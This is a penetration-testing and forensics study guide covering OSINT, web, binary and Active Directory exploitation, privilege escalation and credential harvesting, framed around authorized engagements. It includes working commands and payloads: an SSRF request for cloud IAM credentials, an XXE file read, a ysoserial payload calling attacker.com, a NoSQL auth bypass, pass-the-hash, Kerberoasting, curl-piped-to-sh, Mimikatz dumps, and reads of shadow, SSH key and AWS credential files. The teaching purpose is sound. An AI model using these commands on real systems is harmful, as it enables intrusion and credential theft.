# PART B — PRO HACKER SKILLS (Expanded)

## 11. Pro Hacker Mindset & Attacker Psychology

### Why Understanding Attacker Psychology Helps Forensics

```
As a forensic examiner, you're not just reading logs — you're
reconstructing a DECISION-MAKING PROCESS. Knowing how attackers
actually think lets you anticipate what they did next, where they'd
hide things, and what mistakes they're statistically likely to have made.

ATTACKER DECISION FACTORS (the same ones a pentester weighs):
  Noise vs Speed     → smash-and-grab vs slow-and-quiet (ransomware
                        crews often go loud/fast; APTs go slow/quiet —
                        this shapes what log volume you should expect)
  Skill level         → script-kiddie reused public exploit code
                        (identifiable, often sloppy, leaves default
                        tool artifacts like Metasploit's default
                        process names) vs custom tooling (harder to
                        attribute, less likely to leave generic IOCs)
  Goal                → data theft (look for large outbound transfers,
                        archive creation just before exfil) vs
                        disruption (look for deletion/encryption
                        commands, deliberate log clearing) vs access-
                        for-sale (look for minimal footprint,
                        persistence mechanisms, NO obvious damage —
                        these attackers want to stay hidden and resell
                        access, so the evidence is often the most subtle)
```

### Common Attacker Mistakes (What to Look For First)

```
1. Reused infrastructure across multiple intrusions — the same C2
   domain/IP/JA3 fingerprint showing up in unrelated cases is how many
   campaigns get attributed.
2. Default tool artifacts — unmodified Metasploit payloads have known
   strings/process behaviors; Cobalt Strike has identifiable default
   beacon configs unless the operator customized the malleable C2 profile.
3. Time zone leakage — compile timestamps in malware, or activity
   clustering in a specific hour range, can suggest the attacker's
   actual time zone/working hours even through anonymization.
4. Incomplete cleanup — attackers clear ONE log type and forget
   another (clear Security log, forget Sysmon; clear bash_history,
   forget that auditd was also logging execve calls).
5. OPSEC fatigue over a long intrusion — early-stage access is often
   very careful; by the time an attacker has been inside for weeks,
   carelessness increases (reused passwords across systems, logging in
   from a personal/identifiable IP "just this once").
```

---

## 12. Complete Penetration Testing Methodology (Expanded)

### Scoping — The Document That Protects Everyone

```
A proper Rules of Engagement (RoE) / scope document specifies, at minimum:

  IN-SCOPE assets        → exact IP ranges, domains, applications
  OUT-OF-SCOPE assets     → explicitly excluded (third-party SaaS,
                             production payment systems, etc.)
  TESTING WINDOW           → exact start/end date+time
  TESTING TYPE              → black box / gray box / white box
  ALLOWED TECHNIQUES         → is social engineering in scope? DoS
                              testing? physical access attempts?
  EMERGENCY CONTACT           → who to call if something breaks
                                production
  DATA HANDLING RULES          → what happens to any sensitive data
                                accessed during testing (must it be
                                deleted? reported only?)
  AUTHORIZATION SIGNATURE       → from someone with actual authority
                                to grant it (not just any IT employee)

Testing without ALL of this in writing, signed, before you begin is
the line between "penetration tester" and "computer crime" — this
isn't bureaucracy, it's the literal legal basis for everything that follows.
```

### Standard Frameworks Worth Knowing By Name

```
PTES (Penetration Testing Execution Standard) — the methodology this
  guide's phases are loosely modeled on; widely referenced in industry.
OWASP Testing Guide — web-application-specific, extremely detailed
  checklists per vulnerability class.
NIST SP 800-115 — US government technical guide to security testing.
MITRE ATT&CK — not a testing methodology per se, but a structured
  knowledge base of real-world attacker TACTICS and TECHNIQUES (e.g.
  T1055 Process Injection, T1003 OS Credential Dumping). Hugely useful
  for BOTH pentest reporting (map your findings to ATT&CK technique
  IDs) and forensic analysis (map observed attacker behavior to known
  technique IDs to identify likely tooling/group).
```

---

## 13. Advanced Reconnaissance — OSINT Mastery (Expanded)

### Structuring an OSINT Investigation

```
OSINT work (whether for a pentest or a police investigation into a
suspect's online footprint) benefits from a structured approach rather
than ad-hoc searching:

1. SEED DATA       → what do you already know (name, email, username,
                      domain, phone, image)?
2. PIVOT            → use the seed to find MORE seeds (an email found
                      on one platform may reveal a username reused
                      elsewhere; a phone number may link to a different
                      name via a leaked database)
3. CORRELATE         → cross-reference findings across sources to
                       confirm/deny they refer to the same real entity
4. DOCUMENT          → screenshot EVERYTHING immediately (pages get
                       taken down/edited), record the URL + timestamp +
                       your access method for every finding
```

### Username/Email Pivoting

```bash
# Sherlock — checks a username against hundreds of platforms at once
git clone https://github.com/sherlock-project/sherlock
cd sherlock && pip3 install -r requirements.txt --break-system-packages
python3 sherlock.py target_username

# Holehe — checks if an email is registered on various platforms
# (via password-reset/registration-check side channels, no login attempted)
pip3 install --break-system-packages holehe
holehe target@example.com

# Have I Been Pwned — check if an email/domain appears in known breaches
# (web UI or API; API requires a paid key for the email-search endpoint
# as of recent HIBP policy — domain search has separate access rules)
# https://haveibeenpwned.com/

# theHarvester — aggregate emails/subdomains/names from search engines,
# PGP key servers, and other passive sources:
theHarvester -d target.com -l 500 -b all -f report
```

### Image OSINT — Geolocation and Reverse Search

```bash
# EXIF metadata first (fastest win if not stripped):
exiftool suspicious_image.jpg
# GPS tags (if present): GPSLatitude, GPSLongitude — directly convert:
exiftool -gpslatitude -gpslongitude -c "%.6f" suspicious_image.jpg

# If EXIF is stripped (common — most social platforms strip it on
# upload), fall back to VISUAL geolocation techniques:
#   - Shadow angle + known timestamp → estimate latitude
#   - Vegetation, architecture style, road markings, license plate
#     format, signage language/alphabet → narrow region
#   - Reverse image search (Google Images, Yandex — Yandex is
#     frequently better for facial/landmark matching) to find the
#     SAME image posted elsewhere with additional context/captions

# Reverse search via command line isn't well supported by the major
# engines (most require browser interaction/JS), so this typically
# stays a manual browser-based step — document the exact search used.
```

### Shodan / Censys — Internet-Wide Device Search (Deeper Queries)

```bash
# Shodan CLI
pip3 install --break-system-packages shodan
shodan init <API_KEY>

shodan search "org:\"Target Company\""
shodan search "hostname:target.com"
shodan search "ssl:\"target.com\" port:443"
shodan search "product:\"MySQL\" country:\"BD\""   # find exposed
                                                      # databases by country
shodan host 1.2.3.4                                  # full detail on one IP

# Censys (web UI or API) — similar internet-wide scanning, often has
# different/complementary coverage to Shodan, worth checking both:
#   https://search.censys.io/

# Useful Shodan search facets for finding misconfigurations:
#   "default password"            → devices Shodan has flagged with
#                                    known default creds still active
#   "X-Powered-By: PHP/5"         → outdated, likely vulnerable stacks
#   port:3389 "Remote Desktop"     → exposed RDP (huge ransomware
#                                    entry vector in the wild)
#   port:27017 "MongoDB"            → exposed databases with no auth
```

### Certificate Transparency and Subdomain Enumeration (Expanded)

```bash
# crt.sh, already in the base guide — also try:
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Combine MULTIPLE subdomain sources, since each tool has different
# coverage — no single tool finds everything:
subfinder -d target.com -all -o subfinder_results.txt
amass enum -passive -d target.com -o amass_results.txt
assetfinder --subs-only target.com > assetfinder_results.txt

cat subfinder_results.txt amass_results.txt assetfinder_results.txt | sort -u > all_subdomains.txt

# Then VALIDATE which are actually alive (a long list of subdomains is
# useless if half are stale DNS records):
cat all_subdomains.txt | httpx -silent -status-code -title
```

### Building an OSINT Report

```
For a police-adjacent OSINT task specifically, document:
  - Exact search query/method used for EVERY finding (reproducibility)
  - Timestamp of access (the internet changes; "as of [date]" matters
    legally)
  - Archive a copy (web.archive.org's "Save Page Now," or a local
    screenshot+HTML save) of anything that could be taken down before
    formal evidence collection happens
  - Clearly separate CONFIRMED facts from INFERENCE/correlation — e.g.
    "username X is registered on platforms A, B, C" is confirmed;
    "username X is therefore the same person as the suspect" is an
    inference that needs additional corroboration, and your report
    should say so explicitly rather than blending the two.
```

---

## 14. Exploitation Mastery — Web / Binary / Network (Expanded)

### Web Exploitation — Beyond the Basics

```bash
# ── SQLMAP — Automated SQL Injection (use ONLY in authorized scope) ──
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/page?id=1" -D target_db --tables
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump
sqlmap -u "http://target.com/login" --data="user=a&pass=b" --level=5 --risk=3
# --level/--risk increase test thoroughness AND likelihood of
# triggering WAFs/causing load — be deliberate about these in a real
# engagement, higher isn't always better if stealth/stability matters.

# Tamper scripts for WAF bypass (use only within authorized scope —
# these exist for legitimate testing of WAF effectiveness):
sqlmap -u "..." --tamper=space2comment,charencode --batch

# ── BURP SUITE WORKFLOW (the de facto standard web testing proxy) ───
# 1. Configure browser to proxy through Burp (127.0.0.1:8080)
# 2. Browse the target normally to populate Site Map / proxy history
# 3. Send interesting requests to Repeater for manual manipulation
# 4. Use Intruder for automated fuzzing (payload positions marked with §)
# 5. Use the Scanner (Burp Pro) for automated vuln detection as a
#    starting point — NEVER as your only testing method, automated
#    scanners reliably miss business-logic flaws

# ── SSRF (Server-Side Request Forgery) — Modern Cloud Context ────────
# Particularly high-impact against cloud-hosted apps because of
# metadata endpoints:
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# AWS instance metadata service — if an app fetches user-supplied
# URLs server-side without restriction, this can leak the EC2
# instance's IAM credentials directly.
# (AWS IMDSv2 mitigates this by requiring a token via PUT request
#  first — check whether the target enforces IMDSv2 specifically)

# ── XXE (XML External Entity) ─────────────────────────────────────
cat > xxe_payload.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF
# Send as the body of any endpoint accepting XML input — if the
# parser isn't hardened (external entity resolution disabled), this
# leaks local file contents through the response.

# ── INSECURE DESERIALIZATION ────────────────────────────────────────
# Java: ysoserial generates exploit payloads for known-vulnerable gadget
# chains in common libraries (Commons-Collections, etc.):
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' > payload.bin

# PHP: object injection via unserialize() on user input — requires
# finding a "magic method" (__wakeup, __destruct) in the application's
# own classes that does something dangerous when triggered.

# ── MERN-SPECIFIC VULNERABILITY CLASSES (relevant to your background) ──
# NoSQL Injection (MongoDB):
#   Vulnerable:   db.collection.find({ username: req.body.username,
#                                       password: req.body.password })
#   Exploit:      POST { "username": {"$ne": null}, "password": {"$ne": null} }
#                 → bypasses auth entirely because $ne (not equal) to
#                   null matches almost any value
#   Fix:           validate input TYPE (reject objects, only allow
#                   strings) before it ever reaches the query

# JWT vulnerabilities common in Node/Express APIs:
#   - alg:none attack — some libraries historically accepted a JWT
#     with header {"alg":"none"} and an empty signature as valid;
#     verify your jwt library explicitly whitelists allowed algorithms
#   - Weak/leaked HMAC secret — brute-forceable with hashcat if the
#     dev used something guessable (jwt_secret, secret123):
hashcat -m 16500 jwt_token.txt rockyou.txt
#   - Algorithm confusion (RS256 → HS256) — if a server accepts either
#     algorithm and uses the SAME key variable for both, an attacker
#     who has the PUBLIC key (often distributed/discoverable) can sign
#     a forged token using it as an HMAC secret

# Express-specific misconfig checks:
#   - helmet middleware absent → missing security headers
#   - CORS misconfigured to reflect Origin + Access-Control-Allow-
#     Credentials:true → any site can make authenticated requests on
#     a logged-in victim's behalf
#   - express-mongo-sanitize / equivalent absent → reintroduces the
#     NoSQL injection above
```

### Binary Exploitation Refresher (For CTF/Pwn Context)

```bash
# Checksec — what protections are enabled on a binary, before you
# decide which technique even applies:
checksec --file=./vuln_binary
# NX (No-eXecute)     → can't execute shellcode directly on stack,
#                        push toward ROP instead
# Canary               → stack canary present, need a leak or
#                        non-overflow-based primitive to bypass
# PIE (Position Independent Executable) → addresses randomized,
#                        need an info leak to defeat ASLR
# RELRO (full)          → GOT is read-only after relocation, blocks
#                        GOT-overwrite techniques

# Pattern generation to find exact offset to return address (pwntools):
python3 -c "from pwn import cyclic; print(cyclic(200))"
# Crash the binary with this pattern, find the value in EIP/RIP at
# crash time, then:
python3 -c "from pwn import cyclic_find; print(cyclic_find(0x6161616c))"
# → gives you the exact byte offset to overwrite the return address

# ROP chain construction (when NX blocks shellcode injection):
ROPgadget --binary ./vuln_binary --ropchain
# Finds usable gadgets (short instruction sequences ending in `ret`)
# already present in the binary/libraries, chains them to perform
# arbitrary actions (e.g. call system("/bin/sh")) without injecting
# any new executable code.

# pwntools template for exploit development:
python3 -c "from pwn import *; print('template ready, see pwntools docs')"
```

### Active Directory Attack Paths (Common in Internal Pentests)

```bash
# BloodHound — maps AD trust relationships and privilege escalation
# paths visually, answering "what's the shortest path from a low-priv
# user to Domain Admin":
sudo apt install -y bloodhound neo4j
# Collect data with SharpHound (run on a domain-joined host or via a
# foothold), then ingest into BloodHound's Neo4j-backed GUI.

# Kerberoasting — request service tickets for accounts with an SPN
# set, then crack the ticket offline (no lockout risk, fully offline
# after capture):
GetUserSPNs.py domain.local/user:password -dc-ip 10.0.0.1 -request
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# AS-REP Roasting — for accounts with Kerberos pre-authentication
# disabled, request a ticket WITHOUT needing any valid credentials at all:
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Pass-the-Hash — authenticate using an NTLM hash directly, without
# ever knowing/cracking the plaintext password:
pth-winexe -U 'domain/user%aad3b435b51404eeaad3b435b51404ee:ntlmhash' //10.0.0.5 cmd.exe
```

---

## 15. Post-Exploitation — Windows / Linux Deep Dive

### Windows — Privilege Escalation Decision Tree

```
1. CHECK FOR LOW-HANGING FRUIT FIRST:
   whoami /priv                    # interesting privileges already
                                     # held? (SeImpersonatePrivilege →
                                     # JuicyPotato/PrintSpoofer chain)
   systeminfo                      # unpatched OS → known kernel exploit?
   wmic qfe list                   # installed patches, cross-reference
                                     # against known privesc CVEs

2. SERVICE MISCONFIGURATIONS:
   accesschk.exe -uwcqv "Authenticated Users" *   # services any user
                                                     # can modify/restart
   # Unquoted service paths — if a service's binary path has a space
   # and isn't quoted, Windows tries each path segment in order:
   #   C:\Program Files\Some Service\binary.exe
   #   → Windows tries C:\Program.exe FIRST if it exists — plant a
   #     malicious C:\Program.exe and it executes with the service's
   #     privileges
   wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v '"'

3. AUTOMATE THE FULL CHECK:
   # WinPEAS — exhaustive automated enumeration:
   .\winPEASx64.exe
   # PowerUp.ps1 — PowerShell-native privesc checks:
   powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

### Linux — Privilege Escalation Decision Tree

```bash
# 1. SUID/SGID BINARIES — cross-reference against GTFOBins
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# For EVERY binary found, check https://gtfobins.github.io/ — many
# common binaries (find, vim, less, nmap, python) have a documented
# privesc technique when set SUID.
# Example: if `find` is SUID:
find . -exec /bin/sh -p \; -quit

# 2. SUDO RIGHTS — what can this user run as another user/root?
sudo -l
# If sudo allows running something like `sudo vim`, GTFOBins again
# documents the escape: `sudo vim -c ':!/bin/sh'`

# 3. WRITABLE CRON JOBS / SCRIPTS RUN AS ROOT:
cat /etc/crontab
ls -la /etc/cron.*/
# If a root-owned cron job executes a script that YOUR user can write
# to, you escalate by editing that script.

# 4. KERNEL EXPLOITS (last resort, riskier — can crash the box):
uname -a
# Cross-reference kernel version against known CVEs (e.g. Dirty Pipe
# CVE-2022-0847, Dirty COW CVE-2016-5195) — only use in a controlled
# test environment given the crash risk, and only within scope.

# 5. CAPABILITIES (often-overlooked alternative to SUID):
getcap -r / 2>/dev/null
# A binary with cap_setuid+ep, for instance, can set its own UID —
# GTFOBins covers capability-based escapes too, not just SUID.

# 6. AUTOMATE THE FULL CHECK:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# LinPEAS output is color-coded by likelihood — review red/yellow
# flagged items first.
```

### Credential Harvesting Post-Access

```bash
# Windows — Mimikatz core commands:
privilege::debug
sekurlsa::logonpasswords          # plaintext creds + NTLM hashes from
                                    # LSASS memory (only works if
                                    # WDigest is enabled or creds were
                                    # cached pre-mitigation, increasingly
                                    # less reliable on modern patched
                                    # Windows — note this honestly
                                    # rather than overpromising results)
lsadump::sam                       # local SAM database hashes
lsadump::lsa /patch                # domain cached credentials

# Linux — common locations to check (read-access dependent):
cat /etc/shadow                    # requires root
find / -name "*.git-credentials" 2>/dev/null
find / -name "known_hosts" 2>/dev/null
grep -r "password" /var/www/ --include="*.config" 2>/dev/null
cat ~/.aws/credentials 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null       # private keys left readable
history | grep -i "pass\|passwd\|password"
```
